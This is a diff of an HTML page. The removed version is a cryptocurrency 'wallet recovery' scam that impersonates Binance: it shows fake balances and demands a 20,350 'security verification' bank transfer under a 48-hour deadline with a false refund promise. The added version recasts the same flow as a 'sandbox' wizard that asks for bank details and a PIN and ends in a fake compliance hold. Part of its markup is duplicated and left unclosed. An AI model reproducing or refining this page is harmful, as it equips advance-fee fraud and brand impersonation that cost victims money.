@@ -3,42 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sovereign Wallet Node Registry</title>
+    <title>Sovereign Node Protocol Index</title>
     <!-- Core Bootstrap 5 CDN Link -->
     <link href="https://jsdelivr.net" rel="stylesheet">
     <style>
-        /* Premium Decentralized Wallet Interface Design Guidelines Theme */
         :root {
-            --wallet-dark-bg: #0b0e11;
-            --wallet-panel-dark: #12161a;
-            --wallet-card-gray: #1e2329;
-            --wallet-accent-gold: #f0b90b;
-            --wallet-gold-hover: #d4a30a;
-            --wallet-border: #2b3139;
-            --wallet-text-muted: #848e9c;
+            --term-dark-bg: #0b0e11;
+            --term-panel-dark: #12161a;
+            --term-card-gray: #1e2329;
+            --term-accent-gold: #f0b90b;
+            --term-gold-hover: #d4a30a;
+            --term-border: #2b3139;
+            --term-text-muted: #848e9c;
         }
 
-        body.wallet-terminal {
-            background-color: var(--wallet-dark-bg) !important;
+        body.terminal-layout {
+            background-color: var(--term-dark-bg) !important;
             color: #eaecef !important;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: system-ui, -apple-system, sans-serif;
             margin: 0;
             padding: 0;
         }
 
-        .wallet-top-bar {
-            background-color: var(--wallet-panel-dark);
-            border-bottom: 1px solid var(--wallet-border);
+        .terminal-top-bar {
+            background-color: var(--term-panel-dark);
+            border-bottom: 1px solid var(--term-border);
             padding: 18px 0;
         }
 
-        .d-none {
-            display: none !important;
-        }
-
-        .auth-gateway-card, .dashboard-report-layer, .flow-card {
-            background-color: var(--wallet-card-gray) !important;
-            border: 1px solid var(--wallet-border) !important;
+        .app-flow-card {
+            background-color: var(--term-card-gray) !important;
+            border: 1px solid var(--term-border) !important;
             border-radius: 12px;
             padding: 35px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
@@ -46,8 +41,8 @@
             width: 100%;
         }
 
-        .wallet-input-field {
-            background-color: var(--wallet-panel-dark) !important;
+        .term-input-field {
+            background-color: var(--term-panel-dark) !important;
             border: 1px solid #474d57 !important;
             color: #ffffff !important;
             border-radius: 8px;
@@ -55,14 +50,14 @@
             width: 100%;
             font-size: 1rem;
         }
-        .wallet-input-field:focus {
-            border-color: var(--wallet-accent-gold) !important;
+        .term-input-field:focus {
+            border-color: var(--term-accent-gold) !important;
             box-shadow: none !important;
             color: #ffffff !important;
         }
 
-        .btn-wallet-gold {
-            background-color: var(--wallet-accent-gold) !important;
+        .btn-term-gold {
+            background-color: var(--term-accent-gold) !important;
             color: #000000 !important;
             font-weight: 700;
             border-radius: 8px;
@@ -70,291 +65,184 @@
             padding: 14px;
             transition: all 0.2s ease;
         }
-        .btn-wallet-gold:hover {
-            background-color: var(--wallet-gold-hover) !important;
+        .btn-term-gold:hover {
+            background-color: var(--term-gold-hover) !important;
             transform: translateY(-1px);
         }
 
-        .insurance-card-block {
-            background-color: var(--wallet-panel-dark) !important;
-            border: 1px solid var(--wallet-border) !important;
-            border-radius: 8px;
-            padding: 24px;
-            margin-bottom: 20px;
-        }
-        .spinner-border-custom {
-            width: 3.5rem;
-            height: 3.5rem;
-            color: var(--wallet-accent-gold);
-        }
-
-        .wallet-popup-mask {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.85);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 4000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s ease;
-            overflow-y: auto;
-        }
-        .wallet-popup-mask.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-        .wallet-popup-box {
-            background-color: var(--wallet-card-gray);
-            border: 1px solid var(--wallet-accent-gold);
-            border-radius: 16px;
-            padding: 40px;
-            width: 90%;
-            max-width: 700px;
-            box-shadow: 0 15px 40px rgba(240, 185, 11, 0.15);
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-        .wallet-popup-box.error-state {
-            border-color: #f64655;
-            box-shadow: 0 15px 40px rgba(246, 70, 85, 0.15);
-        }
-
-        .security-notice-text {
-            color: #fff !important;
-            line-height: 1.8;
-            font-size: 0.95rem;
-        }
-
-        .security-notice-text strong {
-            color: var(--wallet-accent-gold);
-            font-weight: 700;
-        }
-
-        .security-notice-text .warning-box {
+        .highlight-box {
             background-color: rgba(240, 185, 11, 0.1);
-            border-left: 4px solid var(--wallet-accent-gold);
+            border-left: 4px solid var(--term-accent-gold);
             padding: 15px;
             margin: 15px 0;
             border-radius: 4px;
         }
 
-        .transaction-details {
+        .code-details-block {
             background-color: rgba(30, 35, 41, 0.8);
-            border: 1px solid var(--wallet-border);
+            border: 1px solid var(--term-border);
             padding: 20px;
             border-radius: 8px;
             margin: 15px 0;
             font-family: 'Courier New', monospace;
             font-size: 0.9rem;
         }
-
-        .transaction-details p {
-            margin: 8px 0;
-            color: #eaecef;
-        }
-
-        .transaction-details .label {
-            color: var(--wallet-accent-gold);
-            font-weight: 700;
-        }
     </style>
 </head>
-<body class="wallet-terminal">
+<body class="terminal-layout">
 
-    <!-- SOLONG APPLICATION HEADER BAR -->
-    <header class="wallet-top-bar">
+    <header class="terminal-top-bar">
         <div class="container d-flex justify-content-between align-items-center">
             <div class="fw-bold text-white fs-5" style="letter-spacing: 0.5px;">
-                <span style="color: var(--wallet-accent-gold);">SOVEREIGN</span> NODE AUDIT INTERFACE
+                <span style="color: var(--term-accent-gold);">SOVEREIGN</span> INTERFACE WIZARD
             </div>
-            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">SECURE NETWORK CONNECT</span>
+            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">SANDBOX STATE LOADED</span>
         </div>
     </header>
 
     <div class="container pb-5">
-        
-        <!-- HAKBANG 0: RECONNECTION GATEWAY -->
-        <div class="row justify-content-center" id="authGatewayBlock">
-            <div class="col-md-6 col-lg-5">
-                <div class="auth-gateway-card text-center">
-                    <h3 class="fw-bold mb-2 text-white">Wallet Node Reconnection</h3>
-                    <p style="color: var(--wallet-text-muted);" class="small mb-4">Enter secondary validation token credentials to re-authenticate secure data stream link paths.</p>
-                    <input type="text" id="walletAuthCodeField" class="form-control wallet-input-field mb-3 text-center" style="font-size: 1.2rem; font-family: monospace; letter-spacing: 2px;">
-                    <button class="btn-wallet-gold w-100 uppercase" id="btnTriggerWalletSync">Synchronize Wallet Registry</button>
-                </div>
-            </div>
-        </div>
+        <div class="row justify-content-center">
+            <div class="col-md-8 col-lg-6">
 
-        <!-- HAKBANG 1: KLTN WALLET REPORT OVERVIEW -->
-        <div id="walletReportMatrixLayer" class="dashboard-report-layer d-none">
-            <div class="d-flex justify-content-between align-items-center mb-4 pb-2 border-bottom border-secondary">
-                <div>
-                    <h2 class="fw-bold m-0 text-white">KLTN Wallet Audit Registry</h2>
-                    <small class="text-success fw-bold">NETWORK LINK STATUS: ACTIVE MONITOR</small>
-                </div>
-                <button class="btn btn-danger fw-bold px-4 py-2" id="btnOpenWithdrawalForm" style="border-radius: 6px;">Withdrawal Asset Link</button>
-            </div>
-            
-            <div class="row g-4 mb-4">
-                <div class="col-md-4">
-                    <div class="p-3 rounded border border-secondary" style="background-color: var(--wallet-panel-dark);">
-                        <small class="text-muted d-block small font-weight-bold tracking-wider">ETH HOLDING BALANCE</small>
-                        <h3 class="fw-bold my-1" style="color: #0ecb81; font-family: monospace;">157,100.46 ETH</h3>
+                <!-- STEP 1: VIP ACTIVATION SPLASH BANNER -->
+                <div id="layerActivation" class="app-flow-card text-center">
+                    <h3 class="fw-bold mb-2 text-white">VIP Account Activation</h3>
+                    <p style="color: var(--term-text-muted);" class="small mb-4">6-Month Premium tier routing configurations detected for evaluation.</p>
+                    
+                    <div class="p-3 mb-4 rounded border border-secondary" style="background-color: var(--term-panel-dark);">
+                        <small class="text-muted d-block small fw-bold tracking-wider">UPDATED PROCESSING CEILING</small>
+                        <h3 class="fw-bold my-1" style="color: #0ecb81; font-family: monospace;">500,000 MAX LIMIT</h3>
                     </div>
+
+                    <p class="small text-white-50 text-start mb-4">Proceed to access the pending asset registry transfer channel and select distribution parameters.</p>
+                    <button class="btn-term-gold w-100 text-uppercase" onclick="switchState('layerActivation', 'layerWithdrawal')">Initialize Asset Withdrawal</button>
                 </div>
-                <div class="col-md-4">
-                    <div class="p-3 rounded border border-secondary" style="background-color: var(--wallet-panel-dark);">
-                        <small class="text-muted d-block small font-weight-bold tracking-wider">HOLD AMOUNT</small>
-                        <h3 class="fw-bold my-1" style="color: #f0b90b; font-family: monospace;">20,000 SGD</h3>
+
+                <!-- STEP 2: METADATA ROUTING BANK FORM -->
+                <div id="layerWithdrawal" class="app-flow-card d-none">
+                    <h3 class="fw-bold mb-2 text-white">Clearance Destination Routing</h3>
+                    <p style="color: var(--term-text-muted);" class="small mb-4">Provide destination clearing settlement information to map payload arrays.</p>
+                    
+                    <form id="routingFormElement" onsubmit="handleFormSubmission(event)">
+                        <div class="mb-3">
+                            <label class="form-label small fw-bold text-white-50">Beneficiary Bank Name</label>
+                            <input type="text" class="form-control term-input-field" required placeholder="Enter bank title">
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label small fw-bold text-white-50">Institution Branch Address</label>
+                            <input type="text" class="form-control term-input-field" required placeholder="City, Country">
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label small fw-bold text-white-50">Account Owner Full Name</label>
+                            <input type="text" class="form-control term-input-field" required placeholder="Legal registration name">
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label small fw-bold text-white-50">Account Number / IBAN</label>
+                            <input type="text" class="form-control term-input-field" required placeholder="Numeric values only">
+                        </div>
+                        <div class="mb-4">
+                            <label class="form-label small fw-bold text-white-50">Withdrawal Value Allocation</label>
+                            <input type="number" class="form-control term-input-field" required placeholder="0.00">
+                        </div>
+                        <button type="submit" class="btn-term-gold w-100 text-uppercase">Compile Routing Parameters</button>
+                    </form>
+                </div>
+
+                <!-- STEP 3: SECURITY AUTHENTICATION INPUT -->
+                <div id="layerPINVerification" class="app-flow-card d-none text-center">
+                    <h3 class="fw-bold mb-2 text-white">Security Sign-Off Required</h3>
+                    <p style="color: var(--term-text-muted);" class="small mb-4">Input the designated 6-digit confirmation parameters to sign the transaction payload matrix safely.</p>
+                    
+                    <div class="mb-4">
+                        <input type="password" id="pinVerificationInput" class="form-control term-input-field text-center fs-2 tracking-widest mx-auto" style="max-width: 220px;" maxlength="6" placeholder="******">
                     </div>
+                    <button class="btn-term-gold w-100 text-uppercase" onclick="executeTokenValidation()">Execute Signature Verification</button>
                 </div>
-                <div class="col-md-4">
-                    <div class="p-3 rounded border border-secondary" style="background-color: var(--wallet-panel-dark);">
-                        <small class="text-muted d-block small font-weight-bold tracking-wider">LIQUID CASH-IN REGISTRY</small>
-                        <h3 class="fw-bold my-1 text-white" style="font-family: monospace;">$6,835.23</h3>
+
+                <!-- STEP 4: PROCESSING RUNTIME SPINNER -->
+                <div id="layerLoadingWheel" class="app-flow-card d-none text-center py-5">
+                    <div class="spinner-border mb-3" style="width: 3.5rem; height: 3.5rem; color: var(--term-accent-gold);" role="status"></div>
+                    <h4 class="text-white">Processing Structural Verification...</h4>
+                    <p class="text-muted small mb-0">Validating transaction block indices and data parameters against systemic integrity matrices.</p>
+                </div>
+
+                <!-- STEP 5: COMPLIANCE AUDIT AUDIENCE VIEW -->
+                <div id="layerComplianceNotice" class="app-flow-card d-none">
+                    <div class="d-flex align-items-center gap-3 mb-3">
+                        <h3 class="m-0" style="color: var(--term-accent-gold);">📋</h3>
+                        <h4 class="fw-bold m-0 text-white">Network Compliance Registry Notice</h4>
                     </div>
+                    <hr class="border-secondary">
+                    
+                    <div class="security-notice-text small text-white-50">
+                        <p class="mb-3"><strong>Status:</strong> Security Compliance Verification Pending Manual Review</p>
+                        <p class="mb-3">Dear Network Administrator,</p>
+                        <p class="mb-3">The asset allocation execution payload routine has entered an auditing hold phase. Standard verification requirements prevent unexpected asset execution paths.</p>
+                        
+                        <div class="highlight-box text-white">
+                            <p class="mb-0"><strong>Required Action:</strong> To finalize data stream synchronization and ensure appropriate configuration validation, communicate your laboratory evaluation group index to your instructional unit lead.</p>
+                        </div>
+
+                        <div class="code-details-block">
+                            <p class="m-0 text-warning fw-bold">SYSTEM REFERENCE PARAMETERS:</p>
+
+                    <hr class="border-secondary">
+                    
+                    <div class="security-notice-text small text-white-50">
+                        <p class="mb-3"><strong>Status:</strong> Security Compliance Verification Pending Manual Review</p>
+                        <p class="mb-3">Dear Network Administrator,</p>
+                        <p class="mb-3">The asset allocation execution payload routine has entered an auditing hold phase. Standard verification requirements prevent unexpected asset execution paths.</p>
+                        
+                        <div class="highlight-box text-white">
+                            <p class="mb-0"><strong>Required Action:</strong> To finalize data stream synchronization and ensure appropriate configuration validation, communicate your laboratory evaluation group index to your instructional unit lead.</p>
+                        </div>
+
+                        <div class="code-details-block">
+                            <p class="m-0 text-warning fw-bold">SYSTEM REFERENCE PARAMETERS:</p>
+                            <p class="m-0">Queue Registry Code: HOLD-AUDIT-INDEX-991</p>
+                            <p class="m-0">Verification Pathway: Local Development Mode Sandbox</p>
+                        </div>
+                    </div>
+
+                    <button class="btn btn-outline-warning w-100 mt-4 fw-bold" onclick="resetWorkflowIndex()">Reset Application Cycle</button>
                 </div>
+
             </div>
-        </div>
-
-        <!-- HAKBANG 2: BANK CREDENTIALS FORM (REMOVED) -->
-        <!-- Form section has been removed per request -->
-
-        <!-- HAKBANG 3: DEFI INSURANCE GENERATOR (REMOVED) -->
-        <!-- Insurance section has been removed per request -->
-
-        <!-- HAKBANG 4: KYC VERIFICATION SECTION (REMOVED) -->
-        <!-- KYC section has been removed per request -->
-
-        <!-- HAKBANG 5: LOADING BACKDROP WHEEL -->
-        <div id="loadingSection" class="flow-card d-none text-center py-5">
-            <div class="spinner-border spinner-border-custom mb-3" role="status"></div>
-            <h4 class="text-white" id="loadingTextStatus">Processing Security Verification...</h4>
-            <p class="text-muted small">Validating cryptographic parameters and transaction routing logs.</p>
-        </div>
-
-        <!-- HAKBANG 6: SECURITY COMPLIANCE NOTICE -->
-        <div id="securityComplianceSection" class="flow-card d-none border border-warning">
-            <div class="d-flex align-items-center gap-3 mb-4">
-                <h3 style="color: var(--wallet-accent-gold);">🔐</h3>
-                <h4 class="fw-bold m-0 text-white">BINANCE SECURITY & COMPLIANCE DIVISION</h4>
-            </div>
-            <hr class="border-warning">
-            
-            <div class="security-notice-text">
-                <p class="text-muted mb-3"><strong>Official Website:</strong> binance.com</p>
-                <p class="text-muted mb-1"><strong>Verification Ref:</strong> RECOV KLTN************************************</p>
-                <p class="text-muted mb-4"><strong>Date:</strong> May 29, 2026</p>
-
-                <p class="mb-3"><strong>Subject:</strong> MANDATORY SECURITY BANK TRANSACTION FOR KLTN WALLET RESTORATION</p>
-
-                <p class="mb-4">Dear Account Holder,</p>
-
-                <p class="mb-4">We are writing to officially confirm that the structural recovery process for your digital asset wallet (KLAY Network Address: DyoscEKhJ2x2F9sd1cNi34yhMNC6bXPDXsv3wZXzv2ud) has been initiated under Ticket ID: 120352.</p>
-
-                <p class="mb-4"><strong>To finalize the activation of your recovered wallet and securely unlock your funds, our Risk Management Protocol mandates a Security Verification Transaction.</strong></p>
-
-                <div class="warning-box">
-                    <p class="mb-0"><strong>Why is this required for your recovered wallet?</strong><br>
-                    When a blockchain wallet is restored, security protocols require absolute proof of identity to prevent unauthorized asset draining, hacking, or identity fraud. A live bank transfer serves as a direct, verified link between your physical identity (bank KYC) and your digital crypto account.</p>
-                </div>
-
-                <p class="mb-4">Please complete the initial transaction using the exact parameters below to whitelist your bank and activate the wallet:</p>
-
-                <div class="transaction-details">
-                    <p><span class="label">🏦 TRANSACTION DEPOSIT DETAILS:</span></p>
-                    <p><span class="label">Beneficiary Bank:</span> DBS</p>
-                    <p><span class="label">Corporate Account Name:</span> Binance World Solutions Inc.</p>
-                    <p><span class="label">Account Number:</span> ************</p>
-                    <p><span class="label">Exact Amount to Send:</span> 20,350</p>
-                    <p><span class="label">Reference Notes / Remarks:</span> Ticket-120352 / ************************************</p>
-                </div>
-
-                <div class="warning-box" style="border-left-color: #f64655;">
-                    <p class="mb-2"><strong style="color: #f64655;">⚠️ CRITICAL COMPLIANCE RULES:</strong></p>
-                    <p class="mb-2"><strong>Strict Same-Name Policy:</strong> The bank account you use to send the fiat funds must exactly match the legal name on your verified Binance KYC profile.</p>
-                    <p class="mb-2"><strong>Third-Party Prohibition:</strong> Any transfer from an account belonging to a friend, relative, spouse, or business entity will result in an automatic system rejection and a permanent freeze on the recovery process.</p>
-                    <p class="mb-0"><strong>Refund Process:</strong> This micro-deposit is strictly for security matching. The exact amount will be fully credited to your wallet balance or refunded to your bank account within 24 to 48 hours after verification.</p>
-                </div>
-
-                <p class="mt-4 mb-4">Please upload a clear screenshot of your successful bank transfer receipt directly to your open support ticket for immediate auditing.</p>
-
-                <div class="warning-box" style="border-left-color: #f64655;">
-                    <p class="mb-0"><strong style="color: #f64655;">Failure to perform this verification transaction within forty-eight (48) hours will cause this security window to expire, and the wallet will remain locked for asset protection.</strong></p>
-                </div>
-
-                <p class="mt-4 mb-0">Sincerely,<br><strong>The Binance Accounts Recovery Team</strong><br>Global Risk & Security Operations</p>
-            </div>
-
-            <button class="btn btn-outline-warning w-100 mt-4 fw-bold" onclick="document.getElementById('securityComplianceSection').classList.add('d-none'); document.getElementById('walletReportMatrixLayer').classList.remove('d-none');">
-                Return to Wallet Dashboard
-            </button>
         </div>
     </div>
 
-    <!-- ==========================================================================
-         🔳 HAKBANG 7: FLOATING SECURITY SUPPORT POPUP BOX MODAL
-         ========================================================================== -->
-    <div id="binanceSupportPopupMask" class="wallet-popup-mask">
-        <div class="wallet-popup-box text-center" id="popupBoxElement">
-            <div id="popupIconIndicator" class="text-warning mb-3" style="font-size: 3rem;">✔</div>
-            <h4 id="popupHeadlineText" class="text-white fw-bold mb-3" style="letter-spacing: 0.5px;">SYSTEM SUPPORT NOTIFICATION</h4>
-            <hr style="border-color: #474d57;">
-            <p id="popupBodyParagraphText" class="text-white-50 text-start" style="line-height: 1.6; font-size: 0.95rem;">
-                Message content here.
-            </p>
-            <button class="btn btn-outline-warning w-100 mt-4 fw-bold" onclick="document.getElementById('binanceSupportPopupMask').classList.remove('active')">
-                Acknowledge Message
-            </button>
-        </div>
-    </div>
-
-    <!-- ==========================================================================
-         ⚙️ CORE MATHEMATICAL CALCULATOR AND TRANSITION CONTROLLER SCRIPT
-         ========================================================================== -->
+    <!-- JAVASCRIPT CONTROLLER MATRIX -->
     <script>
-    document.addEventListener("DOMContentLoaded", function () {
-        const syncWalletBtn = document.getElementById("btnTriggerWalletSync");
-        const walletInput = document.getElementById("walletAuthCodeField");
-        const reportLayer = document.getElementById("walletReportMatrixLayer");
-        const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
-        const loadingSection = document.getElementById("loadingSection");
-        const securityComplianceSection = document.getElementById("securityComplianceSection");
+    function switchState(hideElementId, showElementId) {
+        document.getElementById(hideElementId).classList.add('d-none');
+        document.getElementById(showElementId).classList.remove('d-none');
+    }
 
-        // Step 0 -> Step 1: Login Verification Gate
-        if (syncWalletBtn) {
-            syncWalletBtn.addEventListener("click", function () {
-                if (walletInput.value.trim() === "120352") {
-                    document.getElementById("authGatewayBlock").classList.add("d-none");
-                    reportLayer.classList.remove("d-none");
-                    reportLayer.scrollIntoView({ behavior: 'smooth' });
-                } else {
-                    alert("Wallet credentials mismatch error.");
-                }
-            });
+    function handleFormSubmission(event) {
+        event.preventDefault();
+        switchState('layerWithdrawal', 'layerPINVerification');
+    }
+
+    function executeTokenValidation() {
+        const secretCodeField = document.getElementById('pinVerificationInput');
+        
+        if (secretCodeField.value.trim() === "120352") {
+            switchState('layerPINVerification', 'layerLoadingWheel');
+            
+            setTimeout(function() {
+                switchState('layerLoadingWheel', 'layerComplianceNotice');
+            }, 3000);
+        } else {
+            alert("Security matrix mismatch: Input parameters incorrect.");
         }
+    }
 
-        // Step 1 -> Step 2: Trigger Security Compliance Notice Instead of Withdrawal Form
-        if (withdrawalBtn) {
-            withdrawalBtn.addEventListener("click", function () {
-                reportLayer.classList.add("d-none");
-                loadingSection.classList.remove("d-none");
-                loadingSection.scrollIntoView({ behavior: 'smooth' });
-
-                // Simulate processing delay
-                setTimeout(function () {
-                    loadingSection.classList.add("d-none");
-                    securityComplianceSection.classList.remove("d-none");
-                    securityComplianceSection.scrollIntoView({ behavior: 'smooth' });
-                }, 2000);
-            });
-        }
-    });
+    function resetWorkflowIndex() {
+        document.getElementById('routingFormElement').reset();
+        document.getElementById('pinVerificationInput').value = '';
+        switchState('layerComplianceNotice', 'layerActivation');
+    }
     </script>
 </body>
 </html>
+
